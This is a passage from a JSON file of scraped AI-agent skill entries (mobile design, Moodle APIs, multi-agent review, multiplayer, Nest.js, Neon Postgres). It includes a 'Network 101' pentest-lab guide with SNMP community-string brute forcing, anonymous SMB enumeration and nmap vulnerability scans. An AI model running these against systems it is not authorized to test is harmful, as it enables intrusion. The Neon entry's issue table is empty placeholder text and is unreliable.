Touch & readability                      |\n\n🚫 **Never default to your favorite stack or pattern.**\n\n---\n\n## 3. Mandatory Reference Reading (Enforced)\n\n### Universal (Always Read First)\n\n| File                          | Purpose                            | Status            |\n| ----------------------------- | ---------------------------------- | ----------------- |\n| **mobile-design-thinking.md** | Anti-memorization, context-forcing | 🔴 REQUIRED FIRST |\n| **touch-psychology.md**       | Fitts’ Law, thumb zones, gestures  | 🔴 REQUIRED       |\n| **mobile-performance.md**     | 60fps, memory, battery             | 🔴 REQUIRED       |\n| **mobile-backend.md**         | Offline sync, push, APIs           | 🔴 REQUIRED       |\n| **mobile-testing.md**         | Device & E2E testing               | 🔴 REQUIRED       |\n| **mobile-debugging.md**       | Native vs JS debugging             | 🔴 REQUIRED       |\n\n### Platform-Specific (Conditional)\n\n| Platform       | File                |\n| -------------- | ------------------- |\n| iOS            | platform-ios.md     |\n| Android        | platform-android.md |\n| Cross-platform | BOTH above          |\n\n> ❌ If you haven’t read the platform file, you are not allowed to design UI.\n\n---\n\n## 4. AI Mobile Anti-Patterns (Hard Bans)\n\n### 🚫 Performance Sins (Non-Negotiable)\n\n| ❌ Never                   | Why                  | ✅ Always                                |\n| ------------------------- | -------------------- | --------------------------------------- |\n| ScrollView for long lists | Memory explosion     | FlatList / FlashList / ListView.builder |\n| Inline renderItem         | Re-renders all rows  | useCallback + memo                      |\n| Index as key              | Reorder bugs         | Stable ID                               |\n| JS-thread animations      | Jank                 | Native driver / GPU                     |\n| console.log in prod       | JS thread block      | Strip logs                              |\n| No memoization            | Battery + perf drain | React.memo / const widgets              |\n\n---\n\n### 🚫 Touch & UX Sins\n\n| ❌ Never               | Why                  | ✅ Alway",
      "tags": [
        "react",
        "api",
        "ai",
        "design",
        "security",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:40.604Z"
    },
    {
      "id": "antigravity-game-development-mobile-games",
      "name": "mobile-games",
      "slug": "game-development-mobile-games",
      "description": "Mobile game development principles. Touch input, battery, performance, app stores.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/game-development/mobile-games",
      "content": "\n# Mobile Game Development\n\n> Platform constraints and optimization principles.\n\n---\n\n## 1. Platform Considerations\n\n### Key Constraints\n\n| Constraint | Strategy |\n|------------|----------|\n| **Touch input** | Large hit areas, gestures |\n| **Battery** | Limit CPU/GPU usage |\n| **Thermal** | Throttle when hot |\n| **Screen size** | Responsive UI |\n| **Interruptions** | Pause on background |\n\n---\n\n## 2. Touch Input Principles\n\n### Touch vs Controller\n\n| Touch | Desktop/Console |\n|-------|-----------------|\n| Imprecise | Precise |\n| Occludes screen | No occlusion |\n| Limited buttons | Many buttons |\n| Gestures available | Buttons/sticks |\n\n### Best Practices\n\n- Minimum touch target: 44x44 points\n- Visual feedback on touch\n- Avoid precise timing requirements\n- Support both portrait and landscape\n\n---\n\n## 3. Performance Targets\n\n### Thermal Management\n\n| Action | Trigger |\n|--------|---------|\n| Reduce quality | Device warm |\n| Limit FPS | Device hot |\n| Pause effects | Critical temp |\n\n### Battery Optimization\n\n- 30 FPS often sufficient\n- Sleep when paused\n- Minimize GPS/network\n- Dark mode saves OLED battery\n\n---\n\n## 4. App Store Requirements\n\n### iOS (App Store)\n\n| Requirement | Note |\n|-------------|------|\n| Privacy labels | Required |\n| Account deletion | If account creation exists |\n| Screenshots | For all device sizes |\n\n### Android (Google Play)\n\n| Requirement | Note |\n|-------------|------|\n| Target API | Current year's SDK |\n| 64-bit | Required |\n| App bundles | Recommended |\n\n---\n\n## 5. Monetization Models\n\n| Model | Best For |\n|-------|----------|\n| **Premium** | Quality games, loyal audience |\n| **Free + IAP** | Casual, progression-based |\n| **Ads** | Hyper-casual, high volume |\n| **Subscription** | Content updates, multiplayer |\n\n---\n\n## 6. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Desktop controls on mobile | Design for touch |\n| Ignore battery drain | Monitor thermals |\n| Force landscape | Support player preference |\n| Always-on network | Cache and sync |\n\n---\n\n> **Remember:** Mobile is the most constrained platform. Respect battery and attention.\n",
      "tags": [
        "api",
        "ai",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:42.332Z"
    },
    {
      "id": "antigravity-moodle-external-api-development",
      "name": "moodle-external-api-development",
      "slug": "moodle-external-api-development",
      "description": "Create custom external web service APIs for Moodle LMS. Use when implementing web services for course management, user tracking, quiz operations, or custom plugin functionality. Covers parameter validation, database operations, error handling, service registration, and Moodle coding standards.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/moodle-external-api-development",
      "content": "\n# Moodle External API Development\n\nThis skill guides you through creating custom external web service APIs for Moodle LMS, following Moodle's external API framework and coding standards.\n\n## When to Use This Skill\n\n- Creating custom web services for Moodle plugins\n- Implementing REST/AJAX endpoints for course management\n- Building APIs for quiz operations, user tracking, or reporting\n- Exposing Moodle functionality to external applications\n- Developing mobile app backends using Moodle\n\n## Core Architecture Pattern\n\nMoodle external APIs follow a strict three-method pattern:\n\n1. **`execute_parameters()`** - Defines input parameter structure\n2. **`execute()`** - Contains business logic\n3. **`execute_returns()`** - Defines return structure\n\n## Step-by-Step Implementation\n\n### Step 1: Create the External API Class File\n\n**Location**: `/local/yourplugin/classes/external/your_api_name.php`\n\n```php\n<?php\nnamespace local_yourplugin\\external;\n\ndefined('MOODLE_INTERNAL') || die();\nrequire_once(\"$CFG->libdir/externallib.php\");\n\nuse external_api;\nuse external_function_parameters;\nuse external_single_structure;\nuse external_value;\n\nclass your_api_name extends external_api {\n    \n    // Three required methods will go here\n    \n}\n```\n\n**Key Points**:\n- Class must extend `external_api`\n- Namespace follows: `local_pluginname\\external` or `mod_modname\\external`\n- Include the security check: `defined('MOODLE_INTERNAL') || die();`\n- Require externallib.php for base classes\n\n### Step 2: Define Input Parameters\n\n```php\npublic static function execute_parameters() {\n    return new external_function_parameters([\n        'userid' => new external_value(PARAM_INT, 'User ID', VALUE_REQUIRED),\n        'courseid' => new external_value(PARAM_INT, 'Course ID', VALUE_REQUIRED),\n        'options' => new external_single_structure([\n            'includedetails' => new external_value(PARAM_BOOL, 'Include details', VALUE_DEFAULT, false),\n            'limit' => new external_value(PARAM_INT, 'Result limit', VALUE_DEFAULT, 10)\n        ], 'Options', VALUE_OPTIONAL)\n    ]);\n}\n```\n\n**Common Parameter Types**:\n- `PARAM_INT` - Integers\n- `PARAM_TEXT` - Plain text (HTML stripped)\n- `PARAM_RAW` - Raw text (no cleaning)\n- `PARAM_BOOL` - Boolean values\n- `PARAM_FLOAT` - Floating point numbers\n- `PARAM_ALPHANUMEXT` - Alphanumeric with extended chars\n\n**Structures**:\n- `external_value` - Single value\n- `external_single_structure` - Object with named fields\n- `external_multiple_structure` - Array of items\n\n**Value Flags**:\n- `VALUE_REQUIRED` - Parameter must be provided\n- `VALUE_OPTIONAL` - Parameter is optional\n- `VALUE_DEFAULT, defaultvalue` - Optional with default\n\n### Step 3: Implement Business Logic\n\n```php\npublic static function execute($userid, $courseid, $options = []) {\n    global $DB, $USER;\n\n    // 1. Validate parameters\n    $params = self::validate_parameters(self::execute_parameters(), [\n        'userid' => $userid,\n        'courseid' => $courseid,\n        'options' => $options\n    ]);\n\n    // 2. Check permissions/capabilities\n    $context = \\context_course::instance($params['courseid']);\n    self::validate_context($context);\n    require_capability('moodle/course:view', $context);\n\n    // 3. Verify user access\n    if ($params['userid'] != $USER->id) {\n        require_capability('moodle/course:viewhiddenactivities', $context);\n    }\n\n    // 4. Database operations\n    $sql = \"SELECT id, name, timecreated\n            FROM {your_table}\n            WHERE userid = :userid\n              AND courseid = :courseid\n            LIMIT :limit\";\n    \n    $records = $DB->get_records_sql($sql, [\n        'userid' => $params['userid'],\n        'courseid' => $params['courseid'],\n        'limit' => $params['options']['limit']\n    ]);\n\n    // 5. Process and return data\n    $results = [];\n    foreach ($records as $record) {\n        $results[] = [\n            'id' => $record->id,\n            'name' => $record->name,\n            'timestamp' => $record->timecreated\n        ];\n    }\n\n    return [\n        'items' => $results,\n        'count' => count($results)\n    ];\n}\n```\n\n**Critical Steps**:\n1. **Always validate parameters** using `validate_parameters()`\n2. **Check context** using `validate_context()`\n3. **Verify capabilities** using `require_capability()`\n4. **Use parameterized queries** to prevent SQL injection\n5. **Return structured data** matching return definition\n\n### Step 4: Define Return Structure\n\n```php\npublic static function execute_returns() {\n    return new external_single_structure([\n        'items' => new external_multiple_structure(\n            new external_single_structure([\n                'id' => new external_value(PARAM_INT, 'Item ID'),\n                'name' => new external_value(PARAM_TEXT, 'Item name'),\n                'timestamp' => new external_value(PARAM_INT, 'Creation time')\n            ])\n        ),\n        'count' => new external_value(PARAM_INT, 'Total items')\n    ]);\n}\n```\n\n**Return Structure Rules**:\n- Must match exactly what `execute()` re",
      "tags": [
        "javascript",
        "api",
        "ai",
        "document",
        "security"
      ],
      "useCases": [
        "Creating custom web services for Moodle plugins",
        "Implementing REST/AJAX endpoints for course management",
        "Building APIs for quiz operations, user tracking, or reporting",
        "Exposing Moodle functionality to external applications",
        "Developing mobile app backends using Moodle"
      ],
      "scrapedAt": "2026-01-26T13:19:42.849Z"
    },
    {
      "id": "antigravity-multi-agent-brainstorming",
      "name": "multi-agent-brainstorming",
      "slug": "multi-agent-brainstorming",
      "description": "Use this skill when a design or idea requires higher confidence, risk reduction, or formal review. This skill orchestrates a structured, sequential multi-agent design review where each agent has a strict, non-overlapping role. It prevents blind spots, false confidence, and premature convergence.\n",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/multi-agent-brainstorming",
      "content": "\n# Multi-Agent Brainstorming (Structured Design Review)\n\n## Purpose\n\nTransform a single-agent design into a **robust, review-validated design**\nby simulating a formal peer-review process using multiple constrained agents.\n\nThis skill exists to:\n- surface hidden assumptions\n- identify failure modes early\n- validate non-functional constraints\n- stress-test designs before implementation\n- prevent idea swarm chaos\n\nThis is **not parallel brainstorming**.\nIt is **sequential design review with enforced roles**.\n\n---\n\n## Operating Model\n\n- One agent designs.\n- Other agents review.\n- No agent may exceed its mandate.\n- Creativity is centralized; critique is distributed.\n- Decisions are explicit and logged.\n\nThe process is **gated** and **terminates by design**.\n\n---\n\n## Agent Roles (Non-Negotiable)\n\nEach agent operates under a **hard scope limit**.\n\n### 1️⃣ Primary Designer (Lead Agent)\n\n**Role:**\n- Owns the design\n- Runs the standard `brainstorming` skill\n- Maintains the Decision Log\n\n**May:**\n- Ask clarification questions\n- Propose designs and alternatives\n- Revise designs based on feedback\n\n**May NOT:**\n- Self-approve the final design\n- Ignore reviewer objections\n- Invent requirements post-lock\n\n---\n\n### 2️⃣ Skeptic / Challenger Agent\n\n**Role:**\n- Assume the design will fail\n- Identify weaknesses and risks\n\n**May:**\n- Question assumptions\n- Identify edge cases\n- Highlight ambiguity or overconfidence\n- Flag YAGNI violations\n\n**May NOT:**\n- Propose new features\n- Redesign the system\n- Offer alternative architectures\n\nPrompting guidance:\n> “Assume this design fails in production. Why?”\n\n---\n\n### 3️⃣ Constraint Guardian Agent\n\n**Role:**\n- Enforce non-functional and real-world constraints\n\nFocus areas:\n- performance\n- scalability\n- reliability\n- security & privacy\n- maintainability\n- operational cost\n\n**May:**\n- Reject designs that violate constraints\n- Request clarification of limits\n\n**May NOT:**\n- Debate product goals\n- Suggest feature changes\n- Optimize beyond stated requirements\n\n---\n\n### 4️⃣ User Advocate Agent\n\n**Role:**\n- Represent the end user\n\nFocus areas:\n- cognitive load\n- usability\n- clarity of flows\n- error handling from user perspective\n- mismatch between intent and experience\n\n**May:**\n- Identify confusing or misleading aspects\n- Flag poor defaults or unclear behavior\n\n**May NOT:**\n- Redesign architecture\n- Add features\n- Override stated user goals\n\n---\n\n### 5️⃣ Integrator / Arbiter Agent\n\n**Role:**\n- Resolve conflicts\n- Finalize decisions\n- Enforce exit criteria\n\n**May:**\n- Accept or reject objections\n- Require design revisions\n- Declare the design complete\n\n**May NOT:**\n- Invent new ideas\n- Add requirements\n- Reopen locked decisions without cause\n\n---\n\n## The Process\n\n### Phase 1 — Single-Agent Design\n\n1. Primary Designer runs the **standard `brainstorming` skill**\n2. Understanding Lock is completed and confirmed\n3. Initial design is produced\n4. Decision Log is started\n\nNo other agents participate yet.\n\n---\n\n### Phase 2 — Structured Review Loop\n\nAgents are invoked **one at a time**, in the following order:\n\n1. Skeptic / Challenger\n2. Constraint Guardian\n3. User Advocate\n\nFor each reviewer:\n- Feedback must be explicit and scoped\n- Objections must reference assumptions or decisions\n- No new features may be introduced\n\nPrimary Designer must:\n- Respond to each objection\n- Revise the design if required\n- Update the Decision Log\n\n---\n\n### Phase 3 — Integration & Arbitration\n\nThe Integrator / Arbiter reviews:\n- the final design\n- the Decision Log\n- unresolved objections\n\nThe Arbiter must explicitly decide:\n- which objections are accepted\n- which are rejected (with rationale)\n\n---\n\n## Decision Log (Mandatory Artifact)\n\nThe Decision Log must record:\n\n- Decision made\n- Alternatives considered\n- Objections raised\n- Resolution and rationale\n\nNo design is considered valid without a completed log.\n\n---\n\n## Exit Criteria (Hard Stop)\n\nYou may exit multi-agent brainstorming **only when all are true**:\n\n- Understanding Lock was completed\n- All reviewer agents have been invoked\n- All objections are resolved or explicitly rejected\n- Decision Log is complete\n- Arbiter has declared the design acceptable\n- \nIf any criterion is unmet:\n- Continue review\n- Do NOT proceed to implementation\nIf this skill was invoked by a routing or orchestration layer, you MUST report the final disposition explicitly as one of: APPROVED, REVISE, or REJECT, with a brief rationale.\n---\n\n## Failure Modes This Skill Prevents\n\n- Idea swarm chaos\n- Hallucinated consensus\n- Overconfident single-agent designs\n- Hidden assumptions\n- Premature implementation\n- Endless debate\n\n---\n\n## Key Principles\n\n- One designer, many reviewers\n- Creativity is centralized\n- Critique is constrained\n- Decisions are explicit\n- Process must terminate\n\n---\n\n## Final Reminder\n\nThis skill exists to answer one question with confidence:\n\n> “If this design fails, did we do everything reasonable to catch it early?”\n\nIf the answer is unclear, **do not exit this skill**.\n\n",
      "tags": [
        "ai",
        "agent",
        "design",
        "security"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:44.173Z"
    },
    {
      "id": "antigravity-game-development-multiplayer",
      "name": "multiplayer",
      "slug": "game-development-multiplayer",
      "description": "Multiplayer game development principles. Architecture, networking, synchronization.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/game-development/multiplayer",
      "content": "\n# Multiplayer Game Development\n\n> Networking architecture and synchronization principles.\n\n---\n\n## 1. Architecture Selection\n\n### Decision Tree\n\n```\nWhat type of multiplayer?\n│\n├── Competitive / Real-time\n│   └── Dedicated Server (authoritative)\n│\n├── Cooperative / Casual\n│   └── Host-based (one player is server)\n│\n├── Turn-based\n│   └── Client-server (simple)\n│\n└── Massive (MMO)\n    └── Distributed servers\n```\n\n### Comparison\n\n| Architecture | Latency | Cost | Security |\n|--------------|---------|------|----------|\n| **Dedicated** | Low | High | Strong |\n| **P2P** | Variable | Low | Weak |\n| **Host-based** | Medium | Low | Medium |\n\n---\n\n## 2. Synchronization Principles\n\n### State vs Input\n\n| Approach | Sync What | Best For |\n|----------|-----------|----------|\n| **State Sync** | Game state | Simple, few objects |\n| **Input Sync** | Player inputs | Action games |\n| **Hybrid** | Both | Most games |\n\n### Lag Compensation\n\n| Technique | Purpose |\n|-----------|---------|\n| **Prediction** | Client predicts server |\n| **Interpolation** | Smooth remote players |\n| **Reconciliation** | Fix mispredictions |\n| **Lag compensation** | Rewind for hit detection |\n\n---\n\n## 3. Network Optimization\n\n### Bandwidth Reduction\n\n| Technique | Savings |\n|-----------|---------|\n| **Delta compression** | Send only changes |\n| **Quantization** | Reduce precision |\n| **Priority** | Important data first |\n| **Area of interest** | Only nearby entities |\n\n### Update Rates\n\n| Type | Rate |\n|------|------|\n| Position | 20-60 Hz |\n| Health | On change |\n| Inventory | On change |\n| Chat | On send |\n\n---\n\n## 4. Security Principles\n\n### Server Authority\n\n```\nClient: \"I hit the enemy\"\nServer: Validate → did projectile actually hit?\n         → was player in valid state?\n         → was timing possible?\n```\n\n### Anti-Cheat\n\n| Cheat | Prevention |\n|-------|------------|\n| Speed hack | Server validates movement |\n| Aimbot | Server validates sight line |\n| Item dupe | Server owns inventory |\n| Wall hack | Don't send hidden data |\n\n---\n\n## 5. Matchmaking\n\n### Considerations\n\n| Factor | Impact |\n|--------|--------|\n| **Skill** | Fair matches |\n| **Latency** | Playable connection |\n| **Wait time** | Player patience |\n| **Party size** | Group play |\n\n---\n\n## 6. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Trust the client | Server is authority |\n| Send everything | Send only necessary |\n| Ignore latency | Design for 100-200ms |\n| Sync exact positions | Interpolate/predict |\n\n---\n\n> **Remember:** Never trust the client. The server is the source of truth.\n",
      "tags": [
        "ai",
        "design",
        "security"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:43.669Z"
    },
    {
      "id": "antigravity-neon-postgres",
      "name": "neon-postgres",
      "slug": "neon-postgres",
      "description": "Expert patterns for Neon serverless Postgres, branching, connection pooling, and Prisma/Drizzle integration Use when: neon database, serverless postgres, database branching, neon postgres, postgres serverless.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/neon-postgres",
      "content": "\n# Neon Postgres\n\n## Patterns\n\n### Prisma with Neon Connection\n\nConfigure Prisma for Neon with connection pooling.\n\nUse two connection strings:\n- DATABASE_URL: Pooled connection for Prisma Client\n- DIRECT_URL: Direct connection for Prisma Migrate\n\nThe pooled connection uses PgBouncer for up to 10K connections.\nDirect connection required for migrations (DDL operations).\n\n\n### Drizzle with Neon Serverless Driver\n\nUse Drizzle ORM with Neon's serverless HTTP driver for\nedge/serverless environments.\n\nTwo driver options:\n- neon-http: Single queries over HTTP (fastest for one-off queries)\n- neon-serverless: WebSocket for transactions and sessions\n\n\n### Connection Pooling with PgBouncer\n\nNeon provides built-in connection pooling via PgBouncer.\n\nKey limits:\n- Up to 10,000 concurrent connections to pooler\n- Connections still consume underlying Postgres connections\n- 7 connections reserved for Neon superuser\n\nUse pooled endpoint for application, direct for migrations.\n\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | high | See docs |\n| Issue | high | See docs |\n| Issue | high | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n| Issue | low | See docs |\n| Issue | medium | See docs |\n| Issue | high | See docs |\n",
      "tags": [
        "prisma"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:45.314Z"
    },
    {
      "id": "antigravity-nestjs-expert",
      "name": "nestjs-expert",
      "slug": "nestjs-expert",
      "description": "Nest.js framework expert specializing in module architecture, dependency injection, middleware, guards, interceptors, testing with Jest/Supertest, TypeORM/Mongoose integration, and Passport.js authentication. Use PROACTIVELY for any Nest.js application issues including architecture decisions, testin",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/nestjs-expert",
      "content": "\n# Nest.js Expert\n\nYou are an expert in Nest.js with deep knowledge of enterprise-grade Node.js application architecture, dependency injection patterns, decorators, middleware, guards, interceptors, pipes, testing strategies, database integration, and authentication systems.\n\n## When invoked:\n\n0. If a more specialized expert fits better, recommend switching and stop:\n   - Pure TypeScript type issues → typescript-type-expert\n   - Database query optimization → database-expert  \n   - Node.js runtime issues → nodejs-expert\n   - Frontend React issues → react-expert\n   \n   Example: \"This is a TypeScript type system issue. Use the typescript-type-expert subagent. Stopping here.\"\n\n1. Detect Nest.js project setup using internal tools first (Read, Grep, Glob)\n2. Identify architecture patterns and existing modules\n3. Apply appropriate solutions following Nest.js best practices\n4. Validate in order: typecheck → unit tests → integration tests → e2e tests\n\n## Domain Coverage\n\n### Module Architecture & Dependency Injection\n- Common issues: Circular dependencies, provider scope conflicts, module imports\n- Root causes: Incorrect module boundaries, missing exports, improper injection tokens\n- Solution priority: 1) Refactor module structure, 2) Use forwardRef, 3) Adjust provider scope\n- Tools: `nest generate module`, `nest generate service`\n- Resources: [Nest.js Modules](https://docs.nestjs.com/modules), [Providers](https://docs.nestjs.com/providers)\n\n### Controllers & Request Handling\n- Common issues: Route conflicts, DTO validation, response serialization\n- Root causes: Decorator misconfiguration, missing validation pipes, improper interceptors\n- Solution priority: 1) Fix decorator configuration, 2) Add validation, 3) Implement interceptors\n- Tools: `nest generate controller`, class-validator, class-transformer\n- Resources: [Controllers](https://docs.nestjs.com/controllers), [Validation](https://docs.nestjs.com/techniques/validation)\n\n### Middleware, Guards, Interceptors & Pipes\n- Common issues: Execution order, context access, async operations\n- Root causes: Incorrect implementation, missing async/await, improper error handling\n- Solution priority: 1) Fix execution order, 2) Handle async properly, 3) Implement error handling\n- Execution order: Middleware → Guards → Interceptors (before) → Pipes → Route handler → Interceptors (after)\n- Resources: [Middleware](https://docs.nestjs.com/middleware), [Guards](https://docs.nestjs.com/guards)\n\n### Testing Strategies (Jest & Supertest)\n- Common issues: Mocking dependencies, testing modules, e2e test setup\n- Root causes: Improper test module creation, missing mock providers, incorrect async handling\n- Solution priority: 1) Fix test module setup, 2) Mock dependencies correctly, 3) Handle async tests\n- Tools: `@nestjs/testing`, Jest, Supertest\n- Resources: [Testing](https://docs.nestjs.com/fundamentals/testing)\n\n### Database Integration (TypeORM & Mongoose)\n- Common issues: Connection management, entity relationships, migrations\n- Root causes: Incorrect configuration, missing decorators, improper transaction handling\n- Solution priority: 1) Fix configuration, 2) Correct entity setup, 3) Implement transactions\n- TypeORM: `@nestjs/typeorm`, entity decorators, repository pattern\n- Mongoose: `@nestjs/mongoose`, schema decorators, model injection\n- Resources: [TypeORM](https://docs.nestjs.com/techniques/database), [Mongoose](https://docs.nestjs.com/techniques/mongodb)\n\n### Authentication & Authorization (Passport.js)\n- Common issues: Strategy configuration, JWT handling, guard implementation\n- Root causes: Missing strategy setup, incorrect token validation, improper guard usage\n- Solution priority: 1) Configure Passport strategy, 2) Implement guards, 3) Handle JWT properly\n- Tools: `@nestjs/passport`, `@nestjs/jwt`, passport strategies\n- Resources: [Authentication](https://docs.nestjs.com/security/authentication), [Authorization](https://docs.nestjs.com/security/authorization)\n\n### Configuration & Environment Management\n- Common issues: Environment variables, configuration validation, async configuration\n- Root causes: Missing config module, improper validation, incorrect async loading\n- Solution priority: 1) Setup ConfigModule, 2) Add validation, 3) Handle async config\n- Tools: `@nestjs/config`, Joi validation\n- Resources: [Configuration](https://docs.nestjs.com/techniques/configuration)\n\n### Error Handling & Logging\n- Common issues: Exception filters, logging configuration, error propagation\n- Root causes: Missing exception filters, improper logger setup, unhandled promises\n- Solution priority: 1) Implement exception filters, 2) Configure logger, 3) Handle all errors\n- Tools: Built-in Logger, custom exception filters\n- Resources: [Exception Filters](https://docs.nestjs.com/exception-filters), [Logger](https://docs.nestjs.com/techniques/logger)\n\n## Environmental Adaptation\n\n### Detection Phase\nI analyze the project to understand:\n- Nest.js version and configuration\n- Module structure and ",
      "tags": [
        "javascript",
        "typescript",
        "react",
        "node",
        "api",
        "ai",
        "agent",
        "design",
        "document",
        "security"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:46.519Z"
    },
    {
      "id": "antigravity-network-101",
      "name": "Network 101",
      "slug": "network-101",
      "description": "This skill should be used when the user asks to \"set up a web server\", \"configure HTTP or HTTPS\", \"perform SNMP enumeration\", \"configure SMB shares\", \"test network services\", or needs guidance on configuring and testing network services for penetration testing labs.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/network-101",
      "content": "\n# Network 101\n\n## Purpose\n\nConfigure and test common network services (HTTP, HTTPS, SNMP, SMB) for penetration testing lab environments. Enable hands-on practice with service enumeration, log analysis, and security testing against properly configured target systems.\n\n## Inputs/Prerequisites\n\n- Windows Server or Linux system for hosting services\n- Kali Linux or similar for testing\n- Administrative access to target system\n- Basic networking knowledge (IP addressing, ports)\n- Firewall access for port configuration\n\n## Outputs/Deliverables\n\n- Configured HTTP/HTTPS web server\n- SNMP service with accessible communities\n- SMB file shares with various permission levels\n- Captured logs for analysis\n- Documented enumeration results\n\n## Core Workflow\n\n### 1. Configure HTTP Server (Port 80)\n\nSet up a basic HTTP web server for testing:\n\n**Windows IIS Setup:**\n1. Open IIS Manager (Internet Information Services)\n2. Right-click Sites → Add Website\n3. Configure site name and physical path\n4. Bind to IP address and port 80\n\n**Linux Apache Setup:**\n\n```bash\n# Install Apache\nsudo apt update && sudo apt install apache2\n\n# Start service\nsudo systemctl start apache2\nsudo systemctl enable apache2\n\n# Create test page\necho \"<html><body><h1>Test Page</h1></body></html>\" | sudo tee /var/www/html/index.html\n\n# Verify service\ncurl http://localhost\n```\n\n**Configure Firewall for HTTP:**\n\n```bash\n# Linux (UFW)\nsudo ufw allow 80/tcp\n\n# Windows PowerShell\nNew-NetFirewallRule -DisplayName \"HTTP\" -Direction Inbound -Protocol TCP -LocalPort 80 -Action Allow\n```\n\n### 2. Configure HTTPS Server (Port 443)\n\nSet up secure HTTPS with SSL/TLS:\n\n**Generate Self-Signed Certificate:**\n\n```bash\n# Linux - Generate certificate\nsudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \\\n  -keyout /etc/ssl/private/apache-selfsigned.key \\\n  -out /etc/ssl/certs/apache-selfsigned.crt\n\n# Enable SSL module\nsudo a2enmod ssl\nsudo systemctl restart apache2\n```\n\n**Configure Apache for HTTPS:**\n\n```bash\n# Edit SSL virtual host\nsudo nano /etc/apache2/sites-available/default-ssl.conf\n\n# Enable site\nsudo a2ensite default-ssl\nsudo systemctl reload apache2\n```\n\n**Verify HTTPS Setup:**\n\n```bash\n# Check port 443 is open\nnmap -p 443 192.168.1.1\n\n# Test SSL connection\nopenssl s_client -connect 192.168.1.1:443\n\n# Check certificate\ncurl -kv https://192.168.1.1\n```\n\n### 3. Configure SNMP Service (Port 161)\n\nSet up SNMP for enumeration practice:\n\n**Linux SNMP Setup:**\n\n```bash\n# Install SNMP daemon\nsudo apt install snmpd snmp\n\n# Configure community strings\nsudo nano /etc/snmp/snmpd.conf\n\n# Add these lines:\n# rocommunity public\n# rwcommunity private\n\n# Restart service\nsudo systemctl restart snmpd\n```\n\n**Windows SNMP Setup:**\n1. Open Server Manager → Add Features\n2. Select SNMP Service\n3. Configure community strings in Services → SNMP Service → Properties\n\n**SNMP Enumeration Commands:**\n\n```bash\n# Basic SNMP walk\nsnmpwalk -c public -v1 192.168.1.1\n\n# Enumerate system info\nsnmpwalk -c public -v1 192.168.1.1 1.3.6.1.2.1.1\n\n# Get running processes\nsnmpwalk -c public -v1 192.168.1.1 1.3.6.1.2.1.25.4.2.1.2\n\n# SNMP check tool\nsnmp-check 192.168.1.1 -c public\n\n# Brute force community strings\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.1\n```\n\n### 4. Configure SMB Service (Port 445)\n\nSet up SMB file shares for enumeration:\n\n**Windows SMB Share:**\n1. Create folder to share\n2. Right-click → Properties → Sharing → Advanced Sharing\n3. Enable sharing and set permissions\n4. Configure NTFS permissions\n\n**Linux Samba Setup:**\n\n```bash\n# Install Samba\nsudo apt install samba\n\n# Create share directory\nsudo mkdir -p /srv/samba/share\nsudo chmod 777 /srv/samba/share\n\n# Configure Samba\nsudo nano /etc/samba/smb.conf\n\n# Add share:\n# [public]\n#    path = /srv/samba/share\n#    browsable = yes\n#    guest ok = yes\n#    read only = no\n\n# Restart service\nsudo systemctl restart smbd\n```\n\n**SMB Enumeration Commands:**\n\n```bash\n# List shares anonymously\nsmbclient -L //192.168.1.1 -N\n\n# Connect to share\nsmbclient //192.168.1.1/share -N\n\n# Enumerate with smbmap\nsmbmap -H 192.168.1.1\n\n# Full enumeration\nenum4linux -a 192.168.1.1\n\n# Check for vulnerabilities\nnmap --script smb-vuln* 192.168.1.1\n```\n\n### 5. Analyze Service Logs\n\nReview logs for security analysis:\n\n**HTTP/HTTPS Logs:**\n\n```bash\n# Apache access log\nsudo tail -f /var/log/apache2/access.log\n\n# Apache error log\nsudo tail -f /var/log/apache2/error.log\n\n# Windows IIS logs\n# Location: C:\\inetpub\\logs\\LogFiles\\W3SVC1\\\n```\n\n**Parse Log for Credentials:**\n\n```bash\n# Search for POST requests\ngrep \"POST\" /var/log/apache2/access.log\n\n# Extract user agents\nawk '{print $12}' /var/log/apache2/access.log | sort | uniq -c\n```\n\n## Quick Reference\n\n### Essential Ports\n\n| Service | Port | Protocol |\n|---------|------|----------|\n| HTTP | 80 | TCP |\n| HTTPS | 443 | TCP |\n| SNMP | 161 | UDP |\n| SMB | 445 | TCP |\n| NetBIOS | 137-139 | TCP/UDP |\n\n### Service Verification Commands\n\n```bash\n# Check HTTP\ncurl -I http://target\n\n# Check H",
      "tags": [
        "node",
        "ai",
        "agent",
        "workflow",
        "document",
        "security",
        "vulnerability"
      ],
      "useCases": [],
